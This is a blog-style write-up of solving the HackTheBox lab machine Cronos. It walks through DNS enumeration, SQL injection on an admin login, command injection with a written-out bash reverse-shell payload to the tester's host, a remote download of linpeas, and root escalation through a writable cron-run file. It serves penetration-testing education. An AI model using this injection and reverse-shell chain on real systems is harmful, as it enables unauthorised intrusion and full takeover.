---
title: Hackthebox - Cronos (Medium)
date: 2023-03-24 12:00:00 +0100
categories: [HackTheBox, Write up]
tags: [linux, nmap,]     # TAG names should always be lowercase
img_path: /img/HTB/Cronos/
image: Cronos.png
---

## Enumeration

### Nmap 

```zsh
┌──(root㉿kali)-[/home/desmond]
└─# nmap -sC -sV -A 10.10.10.13      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 12:12 CDT
Nmap scan report for 10.10.10.13
Host is up (0.074s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18b973826f26c7788f1b3988d802cee8 (RSA)
|   256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)
|_  256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/24%OT=22%CT=1%CU=32995%PV=Y%DS=2%DC=T%G=Y%TM=641DDA2
OS:0%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS
OS:=8)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M
OS:539ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=71
OS:20)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Let's start enumerating dns on port 53, we can do it using nslookup:

```terminal
nslookup 10.10.10.13 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
```
We discovered the domain name cronos.htb, as always let's add it on `/etc/hosts`.

Now we can use dig to enumerate any dns record with
`dig any victim.com @<DNS_IP>`, in our case:

```terminal
dig any cronos.htb @10.10.10.13

; <<>> DiG 9.18.8-1-Debian <<>> any cronos.htb @10.10.10.13
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 19215
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;cronos.htb.                    IN      ANY

;; ANSWER SECTION:
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13

;; ADDITIONAL SECTION:
ns1.cronos.htb.         604800  IN      A       10.10.10.13

;; Query time: 104 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Fri Mar 24 12:18:44 CDT 2023
;; MSG SIZE  rcvd: 131

```
To learn more on dns enumeration [](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns).

Doing so we discovered the admin subdomain `admin.crono.htb`.
Now our `/etc/hosts` row is like that:
`10.10.10.13 cronos.htb admin.cronos.htb`
Vising cronos.htb is useless, instead on the admin subdomain we have a login form, and the user is vulnerable to sql injection.
Once in, we can use two commands ping and traceroute, and there is a rce just by doing ; at the end, and we can add our code. I got a reverse shell with
```
8.8.8.8; /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.18/2332 0>&1"
```

Now we are `www-data` we have to priv esc.

We use a trick to get a better shell
```terminal
www-data@cronos:/tmp$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@cronos:/tmp$ ^Z
zsh: suspended  nc -lvnp 2332
                                                                                                                                                       
┌──(root㉿kali)-[/home/desmond]
└─# stty raw -echo ;fg
[1]  + continued  nc -lvnp 2332
                               reset
reset: unknown terminal type unknown
Terminal type? screen

```
 Now we can use arrows and tab completition.

 Since we have wget, lets host on our machine a python server with `python -m http.server 2323` and get linpeas.sh on the target machine:
 ```terminal
 www-data@cronos:/tmp$ wget http://10.10.14.18:2323/linpeas.sh
--2023-03-24 19:31:37--  http://10.10.14.18:2323/linpeas.sh
Connecting to 10.10.14.18:2323... connected.
HTTP request sent, awaiting response... 200 OK
Length: 765823 (748K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 747.87K   467KB/s    in 1.6s    

2023-03-24 19:31:39 (467 KB/s) - 'linpeas.sh' saved [765823/765823]

 ```
Let's give it permissions to get executed with `chmod +x linpea.sh` and run it `./linpeas.sh`.

Looking at linpeas.sh result we see we have a yellow line (the most dangerous one):
```                                                                              * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1 ```
So we have a cronjob run as root that launch  `/var/www/laravel/artisan` with php.

Checking the permission for `/var/www/laravel/artisan` we see that www-data can is the owner of the file, so we can change it by adding a php reverse shell, that will run as root.

And after a while we'll recive the root shell on our machine!



